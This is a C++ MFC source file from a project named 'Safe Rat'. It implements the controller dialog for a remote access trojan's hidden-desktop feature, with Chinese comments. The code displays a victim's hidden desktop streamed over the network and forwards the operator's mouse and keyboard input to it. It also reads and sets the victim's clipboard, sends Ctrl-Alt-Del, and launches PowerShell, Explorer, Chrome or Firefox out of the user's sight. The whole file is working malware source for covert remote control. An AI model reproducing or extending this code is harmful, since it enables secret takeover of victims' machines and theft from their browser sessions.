// CHideScreenDlg.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CHideScreenDlg.h"
#include "afxdialogex.h"

// CDesktopDlg 对话框
enum
{
	IDM_SET_FLUSH = 0x0010,
	IDM_CONTROL,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_SAVEDIB,		// 保存图片
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板
	IDM_OPEN_Explorer,
	IDM_OPEN_run,
	IDM_OPEN_Powershell,
	IDM_OPEN_Chrome,
	IDM_OPEN_Firefox,
};

IMPLEMENT_DYNAMIC(CHideScreenDlg, CDialogEx)

CHideScreenDlg::CHideScreenDlg(CWnd* pParent /*=NULL*/, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(IDD_SCREEN, pParent)
{

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_bIsFirst = true; // 如果是第一次打开对话框，显示提示等待信息
	m_lpScreenDIB = NULL;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_SPY));
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	m_bIsCtrl = false; // 默认不控制
	m_bCursorIndex = 1;
	m_bOnClose = FALSE;
	m_nFramesPerSecond = 0;
	m_nFramesCount = 0;
	m_MYtagMSG = new MYtagMSG;
	m_MYtagMSGsize = sizeof(MYtagMSG);
	m_LastCursorIndex = 1;

	m_XvidDec.Open(m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_lpbmi->bmiHeader.biBitCount);
}

CHideScreenDlg::~CHideScreenDlg()
{
	DestroyIcon(m_hIcon);
}

void CHideScreenDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CHideScreenDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	//	ON_WM_TIMER()
END_MESSAGE_MAP()

// CHideScreenDlg 消息处理程序
//保存快照
bool CHideScreenDlg::SaveSnapshot()
{
	CString	strFileName = m_pContext->m_RemoteIP + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
	if (dlg.DoModal() != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox(_T("文件保存失败"));
		return false;
	}
	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	// Fill in the fields of the file header
	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
	return true;
}
//窗口关闭
void CHideScreenDlg::OnClose()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	Sleep(200);
	if (m_XvidDec.m_bOpened)
		m_XvidDec.Close();
	::ReleaseDC(m_hWnd, m_hDC);
	DeleteDC(m_hMemDC);
	DeleteObject(m_hFullBitmap);

	if (m_lpbmi)
		SAFE_DELETE_AR(m_lpbmi);
	if (m_lpbmi_rect)
		SAFE_DELETE_AR(m_lpbmi_rect);
	SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));
	m_bIsCtrl = false;
	SAFE_DELETE(m_MYtagMSG);

	CDialogEx::OnClose();
}
//大小改变
void CHideScreenDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (!IsWindowVisible())
		return;

	GetClientRect(&rect);
	ScreenToClient(rect);
	m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
	m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
}
//数据接受处理
void CHideScreenDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN_HIDE:
		m_bIsFirst = false;
		DrawFirstScreen();
		break;
	case TOKEN_NEXTSCREEN_HIDE:
		DrawNextScreenXvid();
		break;
	case TOKEN_BITMAPINFO_HIDE:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT_HIDE:
		UpdateLocalClipboard((char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	case TOKEN_SIZE_HIDE:
		memcpy(&m_rect, m_pContext->m_DeCompressionBuffer.GetBuffer() + 1, sizeof(RECT));
		return;
	default:
		return;
	}

}

BOOL CHideScreenDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	CString str;
	str.Format("%s - 后台桌面 (%d * %d)", m_pContext->m_RemoteIP, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);

	SetClassLongA(m_hWnd, GCLP_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_FLUSH, _T("刷新(&F)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("控制屏幕(&Y)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SEND_CTRL_ALT_DEL, _T("发送Ctrl-Alt-Del(&K)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Explorer, _T("打开-文件管理(&B)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_run, _T("打开-运行(&H)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Powershell, _T("打开-Powershell(&N)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Chrome, _T("打开-Chrome(&I)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Firefox, _T("打开-Firefox(&V)"));
	}

	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);
	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;
	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;
	// 初始化窗口大小结构
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	SelectObject(m_hMemDC, m_hFullBitmap);
	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
	SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
	GetClientRect(&rect);
	ScreenToClient(rect);
	m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
	m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));

	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
	SendNext();
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CHideScreenDlg::ResetScreen()
{
	Sleep(1000);
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi != NULL)
	{
		SAFE_DELETE_AR(m_lpbmi);
		SAFE_DELETE_AR(m_lpbmi_rect);
		m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
		m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
		memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		DeleteObject(m_hFullBitmap);
		m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
		SelectObject(m_hMemDC, m_hFullBitmap);
		SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
		SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
		GetClientRect(&rect);
		ScreenToClient(rect);
		m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
		m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
		m_XvidDec.Close();
		m_XvidDec.Open(m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_lpbmi->bmiHeader.biBitCount);

	}
}


void CHideScreenDlg::SendResetScreen(int	nBitCount)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_RESET_HIDE;
	bBuff[1] = nBitCount;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}

void CHideScreenDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();

	CDialogEx::PostNcDestroy();
	delete this;
}

//消息获取
BOOL CHideScreenDlg::PreTranslateMessage(MSG* pMsg)
{
	switch (pMsg->message)
	{

	case WM_ERASEBKGND:
		return TRUE;
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDBLCLK:
	case WM_MOUSEMOVE:
	case WM_MOUSEWHEEL:
	{
		MSG	msg;
		memcpy(&msg, pMsg, sizeof(MSG));
		int xPos = (int)(short)LOWORD(pMsg->lParam) + GetScrollPos(SB_HORZ);
		int yPos = (int)(short)HIWORD(pMsg->lParam) + GetScrollPos(SB_VERT);
		msg.lParam = MAKELPARAM(xPos, yPos);
		msg.lParam = MAKELPARAM(xPos * m_lpbmi->bmiHeader.biWidth / rect.Width(), yPos * m_lpbmi->bmiHeader.biHeight / rect.Height());
		msg.pt.x = xPos * m_lpbmi->bmiHeader.biWidth / rect.Width();
		msg.pt.y = yPos * m_lpbmi->bmiHeader.biHeight / rect.Height();
		SendCommand(&msg);
		return TRUE;
	}
	case WM_CHAR:
	{
		if (_istcntrl(pMsg->wParam))
			break;
		SendCommand(pMsg);
		return TRUE;
	}
	case WM_KEYDOWN:
	case WM_KEYUP:
	{
		switch (pMsg->wParam)
		{
		case VK_UP:
		case VK_DOWN:
		case VK_RIGHT:
		case VK_LEFT:
		case VK_HOME:
		case VK_END:
		case VK_PRIOR:
		case VK_NEXT:
		case VK_INSERT:
		case VK_RETURN:
		case VK_DELETE:
		case VK_BACK:
			break;
		}
		SendCommand(pMsg);
		return TRUE;
	}

	}
	return CDialog::PreTranslateMessage(pMsg);
}

//渲染第一张
void CHideScreenDlg::DrawFirstScreen()
{
	bool	bIsReDraw = false;
	LPVOID	lpFirstScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	DWORD	dwFirstLength = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;

	if (m_XvidDec.Decode(lpFirstScreen, dwFirstLength, m_lpScreenDIB) > 0)
		bIsReDraw = true;

	m_bIsFirst = false;
	if (bIsReDraw)
	{
#ifdef _DEBUG
		SendNotifyMessage(WM_PAINT, NULL, NULL);
#else
		OnPaint();
#endif // _DEBUG
	}
}
//渲染其余的
void CHideScreenDlg::DrawNextScreenXvid()
{
	++m_nFramesCount;
	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + sizeof(POINT) + sizeof(BYTE); // 标识[1]  + 光标位置[8] + 光标类型索引[1]
	LPVOID	lpLastScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwNextLength = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	// 判断鼠标是否移动
	LPPOINT	lpNextCursorPos = (LPPOINT)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	if (memcmp(lpNextCursorPos, &m_RemoteCursorPos, sizeof(POINT)) != 0 && m_bIsTraceCursor)
	{
		bIsReDraw = true;
		memcpy(&m_RemoteCursorPos, lpNextCursorPos, sizeof(POINT));
	}

	// 光标类型发生变化
	int	nOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(9)[0];
	if (nOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}

	// 屏幕数据是否变化
	if (dwNextLength > 0)
	{
		bIsReDraw = true;
		m_XvidDec.Decode(lpNextScreen, dwNextLength, lpLastScreen);
	}

	if (bIsReDraw)
	{
#ifdef _DEBUG
		SendNotifyMessage(WM_PAINT, NULL, NULL);
#else
		OnPaint();
#endif // _DEBUG
	}
}

//渲染
void CHideScreenDlg::OnPaint()
{
	CPaintDC dc(this);

	if (m_bIsFirst)
	{
		DrawTipString(_T("Please wait - initial screen loading"));
		return;
	}
	if (m_bOnClose) return;

	StretchBlt(m_hDC, 0, 0, rect.Width(), rect.Height(), m_hMemDC, 0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, SRCCOPY);
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			(int)((float)m_RemoteCursorPos.x / m_wZoom),
			(int)((float)m_RemoteCursorPos.y / m_hZoom),
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);
}


//点击了菜单
void CHideScreenDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case SC_MONITORPOWER: // 拦截显示器节电自动关闭的消息
		return;
	case SC_SCREENSAVE:   // 拦截屏幕保护启动的消息
		return;
	case IDM_SET_FLUSH:
	{
		BYTE	bToken = COMMAND_FLUSH_HIDE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_CONTROL:
	{
		m_bIsCtrl = !m_bIsCtrl;
		pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

		if (m_bIsCtrl)
		{
			if (m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			else
				SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)m_hRemoteCursor);
		}
		else
			SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	}
	break;
	case IDM_SEND_CTRL_ALT_DEL:
	{
		BYTE	bToken = COMMAND_SCREEN_CTRL_ALT_DEL_HIDE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_GET_CLIPBOARD: // 获取剪贴板
	{
		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD_HIDE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_SET_CLIPBOARD: // 设置剪贴板
	{
		SendLocalClipboard();
	}
	break;
	case IDM_OPEN_Explorer:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 0;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case 	IDM_OPEN_run:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 1;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case 	IDM_OPEN_Powershell:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 2;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case	IDM_OPEN_Chrome:
	{
		BYTE	bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 3;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	case	IDM_OPEN_Firefox:
	{
		BYTE bToken[2];
		bToken[0] = COMMAND_HIDE_USER;
		bToken[1] = 6;
		m_iocpServer->Send(m_pContext, bToken, 2);
	}
	break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}
void CHideScreenDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);
	COLORREF oldbgcol = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText(m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);

}
//发送消息
void CHideScreenDlg::SendCommand(MSG* pMsg)
{

	if (!m_bIsCtrl)
		return;

	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL_HIDE;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	SAFE_DELETE_AR(lpData);
}

//更新剪切板
void CHideScreenDlg::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GPTR, len);
	if (hglbCopy != NULL) {
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

//发送自己的剪切板数据
void CHideScreenDlg::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD_HIDE;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}

//通知对话框已经打开
void CHideScreenDlg::SendNext()
{
	BYTE	bBuff = COMMAND_NEXT_HIDE;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}
//消息回调
LRESULT CHideScreenDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: Add your specialized code here and/or call the base class
	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
	{
		return BROADCAST_QUERY_DENY; // 拦截系统待机, 休眠的请求
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam))
	{
		SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) == WA_INACTIVE)
	{
		SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}

	return CDialog::WindowProc(message, wParam, lParam);
}
